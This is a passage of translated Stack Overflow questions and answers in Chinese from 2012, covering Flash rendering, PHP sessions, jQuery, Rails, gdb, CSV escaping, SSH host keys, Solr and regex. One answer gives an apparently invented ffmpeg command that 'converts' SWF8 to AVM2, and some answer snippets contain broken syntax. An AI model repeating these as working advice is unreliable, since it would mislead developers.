我上传了一个非常轻量级的 flash builder 项目，包括上面 swf 的整个源代码： [https ://dl.dropbox.com/u/55967135/test.zip](https://dl.dropbox.com/u/55967135/test.zip)

```
 public function enterFrame():void               
      {

           // Calculate the time since the last frame  (NOT USED IN THE EXAMPL PROGRAM)                   
           var thisFrame : Date = new Date();               
           var dT : Number = (thisFrame.getTime() - lastFrame.getTime())/1000.0;               
           lastFrame = thisFrame;          

           // erase backBuffer
           backBuffer.fillRect(backBuffer.rect, 0xFFFFFFFF);

           // set new postion of the small testimage
           if (this.pos > 600 || this.pos < 0) {
                this.direction = !this.direction;
           }

           // increase / decrease vertical position
           if (this.direction) {
                this.pos += 2;
           } else {
                this.pos -= 2;
           }

           //trace(pos);
           // draw small test image at postion "offset"
           backBuffer.copyPixels(     this.testGraphic.bitmap.bitmapData, 
                                         this.testGraphic.bitmap.bitmapData.rect, 
                                         new Point(pos, 0.0));               
      } 
```

enterFrame() 是我的类 GraphicsController 的一个方法，它处理双缓冲。它由应用程序的 enterFrame(event) 方法启动：

```
 public function enterFrame(event:Event):void
           {
                GraphicsController.Instance.enterFrame();     
                myCanvas.graphics.clear();
                myCanvas.graphics.beginBitmapFill(GraphicsController.Instance.backBuffer, null, false, false);                              
                myCanvas.graphics.drawRect(0, 0, this.width, this.height);                              
                myCanvas.graphics.endFill();
                stage.invalidate();
           } 
```

帮助将不胜感激

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:31:22.717

在 chrome 上运行对我来说非常流畅，但我知道你描述的效果。我在 Firefox 中的一个应用程序中体验过它，但我使用的是显示列表而不是位图数据。我的问题是因为将显示对象移动了不到一个像素，而 flash 对此并不满意。一旦我将对象缩放到 0.99，它就被修复了。

您可以尝试绘制 dT 并查看它是否稳定。它应该是 16.6666（或 0.0166），因为如果它在波动，那么您以 60fps 的速度运行，那么某些东西会导致输入帧事件被推回。

这也可能有用：[http ://www.craftymind.com/2008/04/18/updated-elastic-racetrack-for-flash-9-and-avm2/](http://www.craftymind.com/2008/04/18/updated-elastic-racetrack-for-flash-9-and-avm2/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:32:11.553

首先，您的 backBuffer 没问题，您只需在更新之前 lock() 它，然后在完成更新后 unlock() 它。接下来，当您可以使用 Bitmap 对象时，为什么要重绘图形？因此，您保留 GraphicsController.enterFrame() 原样，在方法代码的开头和结尾添加一个`backBuffer.lock();`和`backBuffer.unlock();`调用，并在初始化阶段使用单个 Bitmap 对象，该对象将在 enterFrame 调用期间自动更新。应用程序的 enterFrame() 中的所有其他内容都将变得无用。

基本上我所说的是将你的画布从 Shape 类型更改为 Bitmap 类型，该位图将硬链接到 GraphicsController 的 backBuffer 并将自动更新。

# php - PHP如何启动安全会话

> ID：12318564
> 
> 赞同：0
> 
> 时间：2012-09-07T12:55:32.317
> 
> 标签：php, mysql, security, session, login

目前我正在开始一个会话，如下所示：

```
if ($hasher->CheckPassword($password, $hash)) { //$hash is the hash retrieved from the DB 
        $what = 'Authentication succeeded';
            $_SESSION['username']=$_POST['username'];
         header('Location: securedpage1.php');
    } else {
        $what = 'Authentication failed';
        echo "Incorrect Password";
        include 'login.php';
        exit();

    } 
```

如您所见，我想知道是否`$_SESSION['username']=$_POST['username'];`是开始会话的最佳方式，或者是否有更好的做法

感谢您的任何回复！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:12:03.590

您可以使用数据库而不是文件系统作为存储点来滚动您自己的会话处理程序。这有几个安全优势，例如在共享主机上，存储在文件系统中的会话数据可能会受到损害。正如我在评论中提到的，您还可以以这种方式存储“源”IP 地址并将其绑定到会话，并使从原始 IP 以外的 IP 访问的任何会话无效。

这篇文章解释得很详细：[http ://shiflett.org/articles/storing-sessions-in-a-database](http://shiflett.org/articles/storing-sessions-in-a-database)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:13:19.953

`$_SESSION['username']=$_POST['username'];`实际上并没有开始会话，`session_start()`确实如此。所以你的问题放错地方了。

那行代码本质上没有任何问题。

如果您想了解有关编写安全会话代码的一些信息，这不是一个糟糕的起点： http: [//phpmaster.com/php-sessions/](http://phpmaster.com/php-sessions/)

您可以搜索的两个安全关键字是“会话固定”和“会话劫持”。另外两个常见的安全问题是 XSS 攻击和 CSRF 攻击。

stackoverflow 上已经有很多关于这个主题的问题，你应该搜索一下。[例如](https://stackoverflow.com/questions/4798711/how-do-i-make-sessions-more-secure?lq=1).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T13:08:01.557

它没有在示例中显示，但我认为 a`session_start()`在您的代码中某处？您可以在此处了解有关会话开始的更多信息：[`PHP Manual: Session Start`](http://php.net/manual/en/function.session-start.php)

# javascript-events - 从数组更改背景

> ID：12318566
> 
> 赞同：0
> 
> 时间：2012-09-07T12:55:42.467
> 
> 标签：javascript-events

我在一个页面上有一组缩略图。我希望它们是可点击的，当点击时，我希望该图像填充页面上的另一个元素作为平铺背景。而已。

我已经看到这个问题得到了回答，而 JQuery 似乎是首选答案。我是 javascript 的新手，在继续深入之前，我试图更好地理解 js 中的逻辑。

无论如何，我有一些可以正常工作的代码（见下文），但我知道它非常笨拙。

```
<style>
       #bkgdPreview {
        position: absolute;
    background-image: url(images/weblinks/Octopus2-bkg.jpg);
    width: 350px;
    height: 350px;
    top: 115px;
    left: 530px;
    }
</style>

<script type="text/javascript">

function change1() {
    document.getElementById("bkgdPreview").style.backgroundImage="url('images/weblinks/image-1.jpg')";
}

function change2() {
    document.getElementById("bkgdPreview").style.backgroundImage="url('images/weblinks/image-2.jpg')";
}

function change3() {
    document.getElementById("bkgdPreview").style.backgroundImage="url('images/weblinks/image-3.jpg')";
}

</script>
</head>
<body>

<div id="gallery">

        <div id="bkgdPreview">
            <p>some text</p>
        </div>
              <div id="thumbnail">
               <a href="#"><img src="images/weblinks/image-1.jpg" width="60" height="60" onclick="change1()"/></a>
               <a href="#"><img src="images/weblinks/image-2.jpg" width="60" height="60" onclick="change2()"/></a>
               <a href="#"><img src="images/weblinks/image-3-bkg.jpg" width="60" height="60" onclick="change3()"/></a>
             </div> 
```

我发布的第一个代码示例按原样工作。但我知道有更好的方法来编写它。我正在自己尝试一些东西，但它只是没有点击（请原谅双关语）。

我想编写一次函数，并通过单击的图像调用它。我只是不知道如何编写函数的最后一部分，或者图像是否应该是数组或对象组或其他东西的一部分。

一旦正确编写，我不确定如何调用该函数。如果可能的话，我还想将所有的 javascript 保存在一个单独的文件中。

```
var myImage = document.getElementById("bkgdPreview");

var imageArray = ["images/weblinks/image-1.jpg", "images/weblinks/image-2.jpg",
                "images/weblinks/image-3.jpg"];

// I don't know what the last part of the function should be
function changeImage() {
    document.myImage.style.backgroundImage="url(this)";
}

//I don't know how I should call the function other than putting it in the HTML
onclick.changeImage(imageArray[this]); 
```

![好吧也许有更好的方法来问这个。 这是一张我一直在处理的代码的图片。 它不起作用，但我认为它有一些正确的部分。 我只是想弄清楚如何将它们组合在一起。](../Images/cbda04948b3040c722258b54898811e7.png)

# ruby-on-rails - 如何从 Facebook 和设计中注销

> ID：12318567
> 
> 赞同：0
> 
> 时间：2012-09-07T12:55:51.457
> 
> 标签：ruby-on-rails, facebook, ruby-on-rails-3, devise, omniauth

我有以下情况：

*   用户使用 Facebook connect 登录（设计、omniauth）
*   用户开始浏览网站
*   用户从 Facebook 注销
*   用户仍然可以浏览。<-- 我怎样才能防止这种情况发生？

更新：

我关注了 gist.github.com/848721 但我仍然无法解决

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:34:39.227

您可以使用访问令牌将用户重定向到 facebook 注销页面。

```
redirect_to "https://www.facebook.com/logout.php?next=#{YOUR_REDIRECT_URL}&access_token=#{USER_ACCESS_TOKEN}" 
```

您可以与这样的设计集成：

**控制器/application_controller.rb**

```
def after_sign_out_path_for(resource_or_scope)
  "https://www.facebook.com/logout.php?next=#{YOUR_REDIRECT_URL}&access_token=#{USER_ACCESS_TOKEN}"
end 
```

# swfobject - OpenLaszlo的swf10环境下可以播放swf8资源吗？

> ID：12318569
> 
> 赞同：1
> 
> 时间：2012-09-07T12:56:01.617
> 
> 标签：swfobject, openlaszlo, lzx

我知道在 swf10 中播放 swf 8 资源是不可能的。但是有什么解决方法吗？我想通过使用更改一个资源的帧值

```
this.viewname.setAttribute('frame',3). 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T16:12:33.197

如果您的 SWF 文件是纯 SWF 电影，那么它有一个 AVM 编解码器，您无法在 Flash 9+ 中播放，但您可以将其重新编码为 AVM2，它可以使用 FFMPEG 等视频转换工具在 Flash 9+ 中工作（[http://ffmpeg.org/](http://ffmpeg.org/)）使用类似于以下的命令：

```
ffmpeg -i mysfw8file.swf -f avm2 myswf10file.swf 
```

（这假设您拥有支持 AVM2 编解码器的最新版本的 FFMPEG）。

注意：如果您的 SWF8 是一个应用程序，那么它将产生不可预知的结果，因为 OpenLaszlo 视图从未打算加载 SWF 应用程序，而只是加载 SWF 影片。

# gdb - HP PA-RISC 在 gdb 中加载符号表

> ID：12318579
> 
> 赞同：0
> 
> 时间：2012-09-07T12:57:18.243
> 
> 标签：gdb, debug-symbols

我有一个文件格式为“PA-RISC2.0 共享可执行文件”的二进制文件。并通过运行此二进制文件进行核心转储。我有堆栈跟踪。为了获得更多信息，我试图提取符号表并将其加载到 gdb 会话中。

问题是我无法提取符号表 PA-RISC2.0 SOM 文件格式。命令 'odump' 和 'nm' 以 ascii 文本输出符号表，gdb 无法加载该符号表。

在 Linux 中，对于 ELF 文件格式，可以使用 'objcopy --keep-only-debug' 来提取符号表。

有没有办法从上述文件格式的可执行文件中提取符号表。

操作系统为 HP-UX 11i

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T03:27:54.153

> 有没有办法从上述文件格式的可执行文件中提取符号表。

您的问题似乎基于错误的前提——以某种方式从可执行文件中提取符号表信息将为 GDB 提供比 GDB 本身能够从可执行文件中提取的信息更多的信息。它*不会*。

当`objcopy --keep-only-debug`您想要保留调试符号但想要将剥离的可执行文件发送给客户时，它是可用的。当您有一个调试可执行文件和一个要调试的核心转储时，它*没有用。*

更新：

> 在 gdb 中，如果我能够加载符号表，我可以获得局部变量的值，如果我没有的话，这是不可能的。

是的，但是您*不需要*为此从可执行文件中提取符号表到*单独*的文件中——GDB 将直接从可执行文件中加载符号表*，*无需任何额外步骤。

我怀疑您没有正确调用 GDB。不要这样做：`gdb -c core`。改为这样做：`gdb /path/to/a.out /path/to/core`.

更新 2：

> 是的，我愿意`gdb <binary> <core>`

在这种情况下，也许您错过了`pxdb`预处理步骤？HP-UX 版本的 GDB 会自动运行`/opt/langtools/bin/pxdb`以将调试信息转换为 GDB 可以理解的格式。但也许你使用的 GDB 太旧了，或者你的系统没有`/opt/langtools/bin/pxdb`安装？

# wxpython - 如何设置默认值（）？

> ID：12318581
> 
> 赞同：1
> 
> 时间：2012-09-07T12:57:23.580
> 
> 标签：wxpython

我是 wxpython 的新手，但我必须编辑一个（大）给定代码：

```
bsButtons = wx.BoxSizer(wx.HORIZONTAL)
self.cmdOk = wx.Button(self, label=_(u"Ok"))
self.cmdOk.Bind(wx.EVT_BUTTON, self.OnOk)
bsButtons.Add(self.cmdOk,
              border=4,
              flag=wx.RIGHT)
self.cmdCancel = wx.Button(self, label=_(u"Abbrechen"))
self.cmdCancel.Bind(wx.EVT_BUTTON, self.OnCancel)
bsButtons.Add(self.cmdCancel) 
```

...

```
def OnOk(self, event):
    self.EndModal(wx.ID_OK)
def OnCancel(self, event):
    self.EndModal(wx.ID_CANCEL) 
```

我想默认将焦点设置在“OK”按钮上，这样“Enter”键就会执行这个按钮。我已经尝试添加这一行：

```
self.cmdOk.SetDefault() 
```

但这没有用。（没有错误，但按 Enter 没有效果）任何人都可以帮助我吗？谢谢！

编辑：我插入了以下内容：

```
self.Bind(wx.EVT_KEY_DOWN, self.on_key_down)

...

    def on_key_down(self, event):
        if event.GetKeyCode() == wx.WXK_RETURN:
            self.EndModal(wx.ID_OK)
        else:
            event.Skip() 
```

但这不起作用。缺少一些东西：我知道第一行必须如下所示：

```
self.button.Bind(wx.EVT_BUTTON, self.OnButton) 
```

但我不知道我的情况是什么“按钮”？！

Edit2：最后它起作用了：

```
self.etcFormula.Bind(wx.EVT_KEY_DOWN, self.on_key_down) 
```

etcFormula 是我正在谈论的编辑行（焦点所在的位置）。所以现在我明白了，当我想抓住 Enter 按钮时，我必须参考这个编辑行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:06:45.230

打电话`self.cmdOk.SetFocus()`应该可以。

编辑：

如果您想通过文本字段处理输入，您可以沿着绑定到`wx.EVT_KEY_DOWN`.

```
def on_key_down(event):
    if event.GetKeyCode() == wx.K_RETURN:
        self.EndModal(wx.ID_OK)
    else:
         event.Skip() 
```

# php - 根据通过 Jquery 在下拉列表中的选择禁用数字字段

> ID：12318593
> 
> 赞同：0
> 
> 时间：2012-09-07T12:58:09.560
> 
> 标签：php, javascript, jquery

我想要做的是，如果用户选择“bycrypt”，它应该显示一个字段来询问多少次通过，如果他/她选择“sha512”来显示相同​​的字段，但被禁用。建议我使用 Jquery 执行此操作，但我的尝试不起作用。我的代码如下：

```
 <fieldset>
    <legend>Security</legend>
    <label>Hash Type</label>
    <select name="hash" id="myId">
            <option value="bcrypt"<?php if($hash == 'bcrypt') { echo ' selected="selected"'; } ?>>Bcrypt</option>
            <option value="sha512"<?php if($hash == 'sha512') { echo ' selected="selected"'; } ?>>SHA512</option>
        </select>

    <script type="text/javascript" src="http://code.jquery.com/jquery-1.8.1.min.js" /></script>
    <label>Bcrypt rounds <i>(12 Rounds is recommended)</i></label>
    <script type="text/javascript>
    $("#myId").change(function() {
var tst = document.getElementById('myId').value;

if (tst ==1) {
    document.getElementById('#bcrypt_rounds').disabled=true;
} else {
    document.getElementById('#bcrypt_rounds').disabled=false;
}
});

    </script>
<input name="bcrypt_rounds" id="bcrypt_rounds" type="text" value="<?php echo $bcrypt_rounds; ?       >" /> 
```

以上更新。现在在“bycrpt_rounds”标签之后切断页面。没有到达“bycrypt_rounds”的字段。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:02:22.273

像这样的东西：

```
<script type="text/javascript">
$("#myId").change(function() {
    var tst = document.getElementById('myId').value;

    if(tst == "sha512") {
        document.getElementById('number_field_id').disabled=true;
    } else {
        document.getElementById('number_field_id').disabled=false;
    }
});
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:07:43.233

我认为这应该做

```
$("#myId").change(function() { 
    if($(this).val() == 'sha512'){
      $('#textBxId').attr({'disabled','disabled'});
    }else{
      $('#textBxId').removeAttr({'disabled'});
    }
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T13:08:43.053

找到错误，你只是忘记了一个`"`in`<script type="text/javascript">`

```
<fieldset>
    <legend>Security</legend>
    <label>Hash Type</label>
    <select name="hash" id="myId">
            <option value="bcrypt"<?php if($hash == 'bcrypt') { echo ' selected="selected"'; } ?>>Bcrypt</option>
            <option value="sha512"<?php if($hash == 'sha512') { echo ' selected="selected"'; } ?>>SHA512</option>
        </select>

    <script type="text/javascript" src="http://code.jquery.com/jquery-1.8.1.min.js" /></script>
    <label>Bcrypt rounds <i>(12 Rounds is recommended)</i></label>
    <script type="text/javascript">
    $("#myId").change(function() {
var tst = $('myId').val();

if (tst ==1) {
    $('#bcrypt_rounds').attr('disabled','disabled');
} else {
    $('#bcrypt_rounds').removeAttr('disabled');
}
});

    </script>
<input name="bcrypt_rounds" id="bcrypt_rounds" type="text" value="<?php echo $bcrypt_rounds; ?       >" /> 
```

# javascript - JS 异常：动画不是函数

> ID：12318598
> 
> 赞同：1
> 
> 时间：2012-09-07T12:58:31.047
> 
> 标签：javascript, jquery, jquery-animate

我在 a 中有一个图像`div`，以及以下 Javascript 代码：

```
function animate_down(key1, key2) 
{
   cimage = document.getElementById('sslot_img' + key1);
   var topval = cimage.offsetTop;
   if (topval == -416) {
        cimage.animate({ top: '0px' }, 5000);
   }
   else {
        topval = topval - 32;
        var toptxt = { 'top': topval.toString() };
        cimage.animate(toptxt, 5000);
    }
} 
```

我已经在 Firebug 中对其进行了测试，当调试器到达`.animate`它抛出的函数时：

```
cimage.animate is not a function 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T12:59:56.317

`getElementById`不是 jQuery 函数，也不会产生 jQuery 对象。`animate`仅在 jQuery 对象上可用。您需要包装您的`cimage`：

```
$(cimage).animate( ... ) 
```

或通过 jQuery 而不是`getElementById`

```
var cimage = $('#sslog_img' + key1); 
```

请注意，如果您使用后一个选项，`cimage`将没有`offsetTop`属性，而是必须使用

```
cimage.offset().top 
```

或者

```
cimage[0].offsetTop 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:00:23.543

`.animate()`是一个 jquery 函数，你需要在一个 jquery 对象上使用它。

代替

```
 cimage = document.getElementById('sslot_img' + key1); 
```

采用

```
 var cimage = $('#sslot_img' + key1); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T13:01:06.810

尝试

```
cimage = $('#sslot_img' + key1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T13:00:44.117

```
cimage = document.getElementById('sslot_img' + key1); 
```

不是 jQuery 对象。

```
$('#sslot_img' + key1'); 
```

将返回一个您可以设置动画的。

# sql - PostgreSQL 仅将特定表设置为字符集

> ID：12318601
> 
> 赞同：4
> 
> 时间：2012-09-07T12:58:41.943
> 
> 标签：sql, postgresql

我找到了一种将数据库设置为字符集的方法，但是如何设置它以便在不同的表上具有某些字符集？

我需要设置一个表来支持 IPA 字符和另一个来支持希伯来语脚本。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-07T13:06:26.733

您需要将数据库编码为 UTF-8，以便能够以各种字符集存储数据。

更多关于[字符集](http://www.postgresql.org/docs/9.0/static/multibyte.html)

如果由于某种原因您需要使用 SQL_ASCII，您可能需要根据您可能需要阅读的字符集更改您的 client_encoding。

# java - log4cxx 构建和编译，但运行时得到 UnsatisfiedLinkException

> ID：12318603
> 
> 赞同：-1
> 
> 时间：2012-09-07T12:58:51.817
> 
> 标签：java, c++, java-native-interface, unsatisfiedlinkerror, log4cxx

我已将 log4cxx 日志记录添加到一个小型 C++ 包装器/JNI 桥。

最初它使用了大量的 printf 语句，但随着它开始被越来越多地使用，控制台开始阻塞，所以我想改用 log4cxx。

代码编译并构建良好。但是当我尝试运行一个名为 TestHarness 的 java 类时，我得到：

```
Exception in thread "main" java.lang.UnsatisfiedLinkError: test/libMyApp.so: test/libMyApp.so: undefined symbol: _ZTIN7log4cxx7helpers13ObjectPtrBaseE 
```

我是 C++ 的完全新手，不知道可能出了什么问题。非常感谢任何帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-11T10:35:00.227

原来这是因为我没有将一些共享对象复制到正确的目录（也没有更新我正在使用的文件）。

# ruby-on-rails - 在 Ruby 中从 CSV 中转义逗号

> ID：12318606
> 
> 赞同：9
> 
> 时间：2012-09-07T12:59:09.587
> 
> 标签：ruby-on-rails, csv

我正在我的 Ruby 应用程序中创建一个 CSV 下载，其中包含一些美元金额字段。这些字段具有 cyrrency 格式的数据，例如 $35,456，当这些数据以 CSV 格式出现时，它被分成两个字段，逗号后的数据移动到 CSV 中的下一列。

这是我呈现 CSV 的代码

```
Sell Date, Sell Amount
- @rows.each do |row|
  = "#{row[0]},#{number_to_currency(row[1], :precision => 2)}" 
```

这是用于返回 CSV 的操作

```
def fifolog
  @rows = Report.fifolog()
respond_to do |format|
  format.csv { render csv: {:rows =>@rows }}
end
end 
```

是否有任何转义字符可以用来在 ruby​​ 中转义“，”

谢谢

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2015-04-29T15:58:06.967

# 使用 Ruby 的内置`to_csv`方法。

*如果您尚未这样做，则需要`require 'csv'`.*

```
Sell Date, Sell Amount
- @rows.each do |row|
  = [ row[0], number_to_currency(row[1], :precision => 2) ].to_csv( row_sep: nil ).html_safe 
```

`to_csv`就在 上可用，`Array`并且执行您期望它执行的所有转义。

`row_sep: nil`防止`\n`在每一行的末尾出现，因为您已经在使用`each`. 没有那个试试，你会看到你得到一个额外的空白行。如果您只是生成单个 CSV 字符串，那么您需要保留`\n`以分隔行。

`html_safe`防止`&quot;`字符出现在您的 CSV 文件中。

应该这样做！

J.P

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-07T13:06:48.260

在带有逗号的值周围使用双引号：

```
"$35,456" 
```

**编辑**：使用 FasterCSV，更改以下行：

```
respond_to do |format|
  format.csv { render csv: {:rows =>@rows }} 
```

到

```
csv_data = FasterCSV.generate do |csv| 
    csv << ["Sell Date", "Sell Amount"] 

    @rows.each do |row| 
      csv << [row[0],number_to_currency(row[1], :precision => 2)] 
    end 
  end 

  send_data csv_data, 
            :type => 'text/csv', 
            :disposition => "attachment; filename=file.csv" 
```

# c# - 在 ASP.MVC 中创建动态模型属性的最佳数据库设计

> ID：12318607
> 
> 赞同：1
> 
> 时间：2012-09-07T12:59:10.157
> 
> 标签：c#, entity-framework, asp.net-mvc-4

我正在使用 asp.mvc 4 和 EF（不是代码优先）。

创建动态模型属性的最佳数据库设计是什么？

例如：我有 ProductModel，我知道一些属性，我可以在那里静态地。但我不知道一些属性，我需要动态创建。像这样：

```
public class ProductModel
{
    public int Id {get;set;}
    public IList<DynamicPropertyValue> DynamicProperties {get;set;}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:23:58.910

也许这可以帮助你。

我有一个带有动态字段的应用程序。我创建了一个这样的表：

```
idField |name |typeField |minVal |maxVal |必需 |启用
-------------------------------------------------- ---------------------
1 |V-AB |浮动 |0 |3500 |0 |1
2 |V-BC |浮点数 |0 |3500 |0 |1
3 |Desc |字符串 |0 |256 |0 |1

```

我像这样使用该字段的表：

```
idMeasurementField |idPumpMeasurement |idField |值
-------------------------------------------------- ----------------------
121 |14 |3 |NIVEL ESTATICO
123 |14 |1 |66.78
124 |14 |2 |34.89

```

# jakarta-ee - ejb-jar.xml：ejb-client.jar 或 ejb-module.jar

> ID：12318609
> 
> 赞同：0
> 
> 时间：2012-09-07T12:59:12.470
> 
> 标签：jakarta-ee, architecture, ejb-3.1

有时，需要在 EJB 部署描述符、ejb-jar.xml 文件中完成配置或声明。

当没有 ejb-client jar-file 时，ejb-jar.xml 位于模块的 META-INF 中：

```
Module-root:
   ---> META-INF
        - ejb-jar.xml
        - ... 
```

但是如果添加了 ejb-jar 客户端，ejb-jar.xml 将位于何处？在客户端的 META-INF 中：

```
Module-root:
   ---> META-INF
        - // here nothing
        - ...

ejb-client-Root:
   ---> META-INF
        - ejb-jar.xml // here something
        - ... 
```

或者 EJB-Module 会像往常一样保留 ejb-jar.file 吗？

谢谢！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-09T15:56:49.363

`ejb-jar.xml`应该始终放在 EJB 模块 JAR 中，与 bean 实现 ( `<ejb-class/>`) .class 文件位于同一位置。可以有一个单独的 EJB 模块，它*也是*一个客户端，在这种情况下，您可能有两个 ejb-jar.xml：一个在“服务”JAR 中，一个在“客户端”jar 中。

# ssh - Hadoop ssh 配置伪分布式模式

> ID：12318610
> 
> 赞同：0
> 
> 时间：2012-09-07T12:59:14.313
> 
> 标签：ssh, hadoop

我正在尝试在本地安装 hadoop。基本上，我遵循了“Hadoop - 权威指南”中的步骤。

一切正常，包括 ssh 配置。其实这不是我第一次安装hadoop。

但是，当我尝试运行 start-all.sh 脚本时，出现此错误：

```
localhost: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
localhost: @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
localhost: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
localhost: IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
localhost: Someone could be eavesdropping on you right now (man-in-the-middle attack)!
localhost: It is also possible that the RSA host key has just been changed.
localhost: The fingerprint for the RSA key sent by the remote host is
localhost: 42:e7:95:2a:32:ac:3b:7e:fa:40:09:0d:b5:01:ed:21.
localhost: Please contact your system administrator.
localhost: Add correct host key in /home/rbelet/.ssh/known_hosts to get rid of this  msg.
localhost: Offending key in /home/rbelet/.ssh/known_hosts:1
localhost: RSA host key for localhost has changed and you have requested strict checking.
localhost: Host key verification failed. 
```

据我了解，我应该将 localhost 服务器的公钥添加到文件 known_host. 我对吗 ？

有什么想法该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:48:03.267

这不是 hadoop 问题，而是纯粹的 SSH 相关问题。看起来您已将 localhost 节点添加到您已知的主机文件中。现在，当您连接到它时，它具有不同的公钥，因此 ssh 意识到有人正试图执行中间人攻击。您可以重新设置密钥以摆脱这种情况。

# solr - Solr 3.6 Suggester 分布式搜索，没有结果

> ID：12318612
> 
> 赞同：1
> 
> 时间：2012-09-07T12:59:17.210
> 
> 标签：solr

我有一个环境如下：

“核心 a”：solr2.domain.com:8080/solr/core_a

“核心 b”：solr2.domain.com:8080/solr/core_b

两者都有一个 /suggest 请求处理程序和一个建议者搜索组件。他们有不同的 schema.xml。

我在服务器 solr1.domain.com:8080/solr 上也有一个“主”solr。

现在，当我对建议者进行如下查询时，我没有得到任何结果： [http ://solr1.domain.com:8080/solr/select?q=a&shards.qt=/suggest&shards=solr2.domain.com:8080/ solr/core_a,solr2.domain.com:8080/solr/core_b](http://solr1.domain.com:8080/solr/select?q=a&shards.qt=/suggest&shards=solr2.domain.com:8080/solr/core_a,solr2.domain.com:8080/solr/core_b)

当我直接调用建议器组件时，例如像这样的 shards=solr2.domain.com:8080/solr/core_a/suggest?q=a 我得到了结果。

# android - 如何创建一条垂直于我当前位置的虚拟线

> ID：12318615
> 
> 赞同：0
> 
> 时间：2012-09-07T12:59:33.970
> 
> 标签：android, math, gps, geometry, 2d

在这里，我不是数学专家，但考虑到手机的方向，我会画一条线开始或至少在我当前位置的两侧放置 2 个点。

基本上它会是：

```
 Orientation

                         ^
                         |
X1(lat,long)<-- MycurrentPosition(lat,long)-->X2(lat,long) 
```

例如：我搜索从我当前的位置和方向计算 X1|X2。X1 和 X2 必须垂直于我当前的位置和方向。

这部分的目标是在用户使用按钮开始录制曲目时制作一条起跑线。

如果用户越线，我发现这个算法可以计算： [http ://www.ahristov.com/tutorial/geometry-games/intersection-lines.html](http://www.ahristov.com/tutorial/geometry-games/intersection-lines.html)

我开始寻找向量，但我承认我很难找到最好的。通过比较数学算法看不到

如果有人可以帮助我吗？

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T14:53:15.913

有一个[很好的资源](http://www.movable-type.co.uk/scripts/latlong.html)，包含有用的公式和代码。您的任务是“从起点给定距离和方位的目标点”。例如，如果您知道自己的位置（起点）和方向，那么

```
 bearing  =  orientation +- 90 degrees 
```

# php - 在控制器代码中禁用模型警告

> ID：12318622
> 
> 赞同：0
> 
> 时间：2012-09-07T12:59:59.280
> 
> 标签：php, cakephp, cakephp-2.0, phpstorm

当我在控制器代码中使用模型时，我会收到“未找到”警告。我使用 phpstorm 4 和 Cakephp 2.x。但这似乎是 CakePHP 的一般情况。

假设我在下面有这样的代码。我的 IDE 发出警告，提示找不到“登录”。我不想通过更改偏好来抑制警告。我怎样才能解决这个问题？

```
App::uses('AppController', 'Controller');
/**
* MyController
*
* @property Signin $Signin
*/
class MyController extends AppController {
      public $uses = array('Signin');
      public function test() {
          $data = $this->Signin->find('all');
          debug($data);
     }
 } 
```

**编辑：**
这里解决了类似的问题：
[http](http://devnet.jetbrains.net/message/5466856)
://devnet.jetbrains.net/message/5466856 论坛中的一位用户说这个问题与Cake有关，而不是IDE。

# jquery - 如何使用 jquery 更新 xml 标签

> ID：12318626
> 
> 赞同：1
> 
> 时间：2012-09-07T13:00:06.350
> 
> 标签：jquery, xml, ajax

我能够使用 jquery、xml 和 html 读取 xml 文件

但我需要用 jquery 更改 xml 中的标记值。

我只需要使用客户端脚本离线执行此任务

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:22:36.593

这很简单。

例如`your_tag.attr('attribute_name')`，如果您使用从 xml 节点读取，您只需`your_tag.attr('attribute_name',value)`写入该值。（这是标签属性值）

如果您想更改标签的所有子项（不是属性，而是标签的所有“内部”），只需编写`your_tag.html('your_value')`

# iphone - iPhone , NSRegularExpression 大浮动

> ID：12318628
> 
> 赞同：1
> 
> 时间：2012-09-07T13:00:11.880
> 
> 标签：iphone, objective-c, regex, parsing, nsregularexpression

我有以下代码：

```
-(NSString*)getNumberFromString(NSString*)theString{
    NSError *error = NULL;
    NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"rhs: \"([0-9]*[.]*[0-9]*)" options:NSRegularExpressionCaseInsensitive | NSRegularExpressionAnchorsMatchLines error:&error];
    NSArray *matches = [regex matchesInString:theString options:0 range:NSMakeRange(0, [theString length])];
    NSTextCheckingResult *match = [matches objectAtIndex:0];
    return [theString substringWithRange:[match rangeAtIndex:1]]);
} 
```

当我尝试解析这个字符串时：

```
{lhs: "1 example", rhs: "44.5097254 Indian sample", error: "", icc: true} 
```

我得到了结果`44.5097254`。

但是对于这个字符串：

```
{lhs: "1 example", rhs: "44.5097254.00.124.2 sample", error: "", icc: true} 
```

我得到一个不正确的结果`44`。我期望得到`44.5097254.00.124.2`.

我究竟做错了什么？

* * *

